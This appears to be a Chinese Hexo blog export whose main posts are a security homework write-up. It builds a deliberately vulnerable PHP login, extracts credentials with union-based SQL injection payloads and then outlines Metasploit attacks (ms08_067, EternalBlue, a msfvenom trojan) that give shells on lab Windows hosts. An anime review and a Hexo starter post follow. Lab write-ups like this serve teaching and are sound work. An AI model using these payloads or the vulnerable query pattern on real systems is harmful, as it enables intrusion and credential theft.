    <content type="text"><![CDATA[网络安全作业二，sql注入，搭建注入环境并注入，以及修补注入漏洞。（图片显示不了的话，点开链接就能看了） 一、服务器搭建1、安装wampserverwampserver在windows下将Apache+PHP+Mysql 集成,一键操作，比较方便，在此选用是因为重点在sql注入上，而不是服务器的搭建，如果想透彻学习服务器搭建，建议不要使用集成环境，可以自己一个一个装，修改配置，最后将这些连到到一起，一个网站就搭好了。 2、安装后的可能会遇到的问题安装完成后，打开，电脑右下角wampserver的图标应该是绿色的，如果是红色和橙色，那就是有些服务没有开启，在图标上左键查看是哪个服务没有开启。 3~_25K4IG`WGJ646US7GU4B.png 花花在安装的时候就是橙色的，原因是之前做的计网实验开启了IIS服务，与apache服务冲突了，所以关掉IIS服务就可以了，具体方法为：计算机——有键——管理——服务，找到IIS关闭即可。如果之前的数据库实验用的不是MySQL，而是SQL sever，则需要将SQL server服务也关闭，方法同上。 3、编写登录页和测试页左键wampserver的小图标，打开www目录，进入，新建两个文件，login.php,test.php。编辑两个文件，代码如下： login.php: &lt;html&gt; &lt;head&gt; &lt;title&gt;网络安全作业二&lt;/title&gt; &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; &lt;/head&gt; &lt;body &gt; &lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt; &lt;fieldset &gt; &lt;legend&gt;自建sql注入平台&lt;/legend&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;用户名：&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密 码：&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;password&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/fieldset&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; test.php: &lt;?php $pwd=$_POST[&#39;password&#39;]; $uname=$_POST[&#39;username&#39;]; //echo &quot;您当前执行的sql语句为：&quot; ; //echo &quot;select * from admin where passward=&#39;$pwd&#39; and name=&#39;$uname&#39;&lt;br/&gt;&quot;; //echo &quot;&lt;hr&gt;&quot;; $mysqli = new mysqli(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;&#39;,&#39;sqlin&#39;); if(mysqli_connect_errno()){ printf(&quot;连接失败:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); } $result = $mysqli-&gt;query(&quot;select * from admin where name=&#39;$uname&#39;&quot;); //print_r($result-&gt;fetch_array(MYSQLI_ASSOC)); if($row=mysqli_fetch_row($result)) { printf (&quot;%s : %s&quot;,$row[0],$row[1]); echo &quot;&lt;br&gt;&quot;; echo &quot;success！&quot;; } else { echo &quot;账号或密码错误！&quot;; } $mysqli-&gt;close(); $result-&gt;close();?&gt; 然后在浏览器上输入http://localhost/login.php，即可进入登陆页面。 不过目前还没有数据库信息，在wampserver小图标左键打开mysql,进入，默认无密码，建立名为sqlin的数据库，和名为admin的表，由于以前做过数据库实验，命令在此不在赘述。 _Z47~NFQ_K3X`XS_D~DT9~9.png 6__2BL4Q_2N89_7SVVLTMF3.png 这样环境就搭好了，可以开始注入了。 二、简单的sql注入判断有几个显示位。输入如下: 用户名：1&#39; union select 1,2,3# 密码：111（任意） 发现报错，显示位不是3，重试 用户名：1&#39; union select 1,2# 密码：111（任意） _AHNB_05K_I_RL5_6_9LCH7.png 显示位为两位 确定表有几列用户名：1&#39; order by 3# 密码：111（任意） 报错，不是3列 用户名：1&#39; order by 2# 密码：111（任意） G_I__P__36X9D_O_YK_OMO9.png 表有2列 获取数据库名用户名：1&#39; union select 1,database() # 密码：111（任意） 0FV6JIXIMQJY_WPE0~I__7T.png 数据库名为sqlin 获取表名用户名：1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 密码：111（任意） X_7_7ZT1P~YPSMBJY`@_026.png 表名为admin 获取列名用户名：0&#39; union select (select column_name from information_schema.columns where table_name=&#39;admin&#39; limit 0,1),(select column_name from information_schema.columns where table_name=&#39;admin&#39; limit 1,2)# 密码：111（任意） 9KK6GFE1E52BIZXKGB90_NS.png 列名为name,passward 获取数据用户名：1&#39; union select name,passward from admin# 密码：111（任意） M_8AP5UDLU_F3~Z2_E_GTGN.png 得到用户名及密码 （建表的时候把password拼错了）😂 三、注入漏洞修补由于select语句并没有对输入的用户名进行检测，而是拿来直接用，造成的注入漏洞，可以对输入的用户名进行长度限制，或者过滤。 🚩推荐阅读DVWA-SQL_Injection_Blind（sql盲注）DVWA-SQL_Injection(SQL注入)利用sqlmap注入dvwa我的WafBypass之道 三篇笔记SQL注入脚本练习]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msf攻击windows]]></title>
    <url>%2F2019%2F10%2F11%2Fmsf%E6%94%BB%E5%87%BBwindows%2F</url>
    <content type="text"><![CDATA[利用msf对windows进行渗透攻击。 一、利用ms08_067攻击xp系统在kali终端输入： msfconsole 进入metasploit 首先搜索这个漏洞 img 然后使用模块 1570774772837.png 查看选项 1570774821418.png 设置目标IP和自身IP，及被攻击系统版本 1570774842853.png 直接攻击返回shell 1570774863433.png 二、利用永恒之蓝（ms17_010）攻击win7首先搜索该漏洞 1570775052329.png 使用该漏洞模块 1570775067326.png 设置目标IP和自身IP，目标系统默认 1570775084979.png 攻击 1570775102714.png 攻击成功，建立会话 1570775118532.png 打开绘画，进入shell 1570775133539.png 三、利用metasploit渗透win10首先通过msfvenom生成木马文件，并放入win10靶机中 1570775167414.png 1570775173831.png 然后在kali上开启监听 1570775193761.png 然后在win10靶机上运行木马程序，监听便能收到，获取shell 1570775209578.png 攻击完成。 以上三个攻击均拿到了shell便可以在对方机器上设置远程用户，然后就可以通过本机的Windows系统远程登陆被攻击的机器，也可以记录对方的键盘记录，远程关机等等]]></content>
      <categories>
        <category>渗透攻击</category>
      </categories>
      <tags>
        <tag>渗透攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一天是不良人，一辈子都是不良人]]></title>
    <url>%2F2019%2F10%2F11%2F%E4%B8%80%E5%A4%A9%E6%98%AF%E4%B8%8D%E8%89%AF%E4%BA%BA%EF%BC%8C%E4%B8%80%E8%BE%88%E5%AD%90%E9%83%BD%E6%98%AF%E4%B8%8D%E8%89%AF%E4%BA%BA%2F</url>
    <content type="text"><![CDATA[不良帅：臣尽力了！ 作者：Apocalypse 这个结局真的很完美，我所说的完美不是指合家欢式的完美，而是逻辑上，剧情上和顺应历史的完美，真的很佩服编剧的想象力和创造力。 根据朱温篡唐称帝，朱友贞即位后梁被灭，还有李存勖称帝的情节，我大致可以得出结论，不良人的动画走势还是会顺应历史事实的，而且李星云这个昭宗第十子确有其人，历史上的确是被老太监救下来，并且改名换姓，叫做胡昌翼，隐居在考水，后来这个地方成为了明经胡氏的发源地，而这个活下来的皇子也就成了胡氏先祖，被称作明经胡公，是胡适，胡雪岩等人的先祖。 那么根据历史，李星云最终肯定是无法称帝的，最后继承后唐之位的是李嗣源，肯定也是他拿走了传国玉玺，历史上的由和氏璧雕琢而成的，代表皇权正统，自秦传下的传国玉玺就是在后唐末帝李从珂手中丢失的。同时由少数民族建立的政权契丹，首领也是剧中出现过的耶律阿保机。所以无论如何，李星云不可能继承大统，所以之前我猜测的结局是他将不良帅引入，并最终二人同归于尽，亦或者合众人之力将不良帅灭尽，并最终归隐山林（符合史实）。无论是哪种我臆想的结局，都把不良帅当作了最后的反派，而上一集的预告也预示着不良帅的反叛。可谁成想，最终为了大唐国运而牺牲自己的，却是他。从敬新磨说出不良帅必死的卦象后，我就猜测到了不良帅的死，但从未想过是以一种忠诚，以一种近乎献祭的方式，告别了这个他存在了300多年的世界。虽然无数种卦象都表明，李星云不可能称帝，但是不良帅近乎偏执的心理，硬是花费了几十年的布局，最终以自己的死为句号，终究是打开了一丝李星云去逐鹿天下的可能。怎么说呢，其实从第一季到第三季39集，我都一直不是很认可这个角色，毕竟他所展现出来的强大实力和飞扬跋扈，就像古代傀儡皇帝身边的权臣一般，让人感觉很不舒服。但是最终，通过这一季，我终于理解这个角色存在的意义和其身上的矛盾了。作为一个能够以一己之力影响数十年局势的人，想要扶植任何一个人登上帝位或者自己登上帝位，都是不费吹灰之力的事情，可是不良帅哪怕是活了300年，心里还是那份对大唐的愚忠。本来我还在怀疑，是因为当初和李淳风关于卦象和大唐气运的争执，才导致他这个好胜且偏执的人一直坚持到现在，只为了和李淳风，或者说天命一争高下。但在他饱含深情的对大唐诸帝一一告别时，我能感受到，袁天罡已经把自己的命运，自己的一切，都和大唐联系起来了。 其实在几十年前布局时，甚至一百多年前构思布局时，亦或者在300年前，他得出卦象之时，就已经确定了他的死期。有一种执着，叫做明知自己已经定格的命运，却还要试图去为大唐做些什么；明知大唐早已衰败，却竭尽全力为国运再续多年；明知达成自己最终的目的希望渺茫，甚至概率为万分之一，也不惜一试，哪怕徒劳地献出自己的一切。他为大唐所献出的，已经完全不止一条命了，而是一个人所拥有的全部，所能够献出的一切。他可以为了保全大唐逆天而行，在世上苟活数百年，尝尽一切人间冷暖；可以为了大唐面容全毁，感官丧失；可以为了大唐而精心布局，用自己必死换得一丝可能，甚至……..不良帅早就知道，大唐的命运已经终结，而自己所做的，无非是用自己的一切，去偿还先帝们的恩情罢了。 对于天下的所有人，他是恐惧和残忍的化身，可对于大唐帝位上的诸宗，他就是千古忠臣，忠于皇室，忠于江山，忠于大唐，甚至，比之众位帝王，他才是大唐的化身。从未僭越，恪守信条，愚忠入骨 我愿於天穷，琅邪倾侧左。 虽欲竭忠诚，欣公归其楚。 快人由为叹，抱情不得叙。 显行天教人，谁知莫不绪。 我愿何时随，此叹亦难处。 今我将何照於光曜，释衔不如雨。 “臣尽力了” 作者：DXBofDream 世间万事，风云变幻，苍黄翻覆，纵使波橘云诡， 但制心一处，便无事不办。 天定胜人，人定兮胜天。 依山傍水房树间，行也安然，坐也安然； 一头耕牛半顷田，收也凭天，荒也凭天。 雨过天晴驾小船，鱼在一边，酒在一边； 路逢骚客问诗篇，好也几言，歹也几言。 布衣得暖胜丝棉，新也可穿，旧也可穿。 粗茶淡饭饱三餐，早也香甜，晚也香甜； 闲暇无事鉴书篇，名也不贪，利也不贪。 夜归挚友话灯前，今也谈谈，古也谈谈； 一觉睡到日三竿，不是神仙，胜似神仙。 img]]></content>
      <categories>
        <category>生活日常</category>
      </categories>
      <tags>
        <tag>动漫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F10%2F10%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new &quot;My New Post&quot; More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment 🚩推荐阅读demo过敏测试和软件测试]]></content>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
</search>
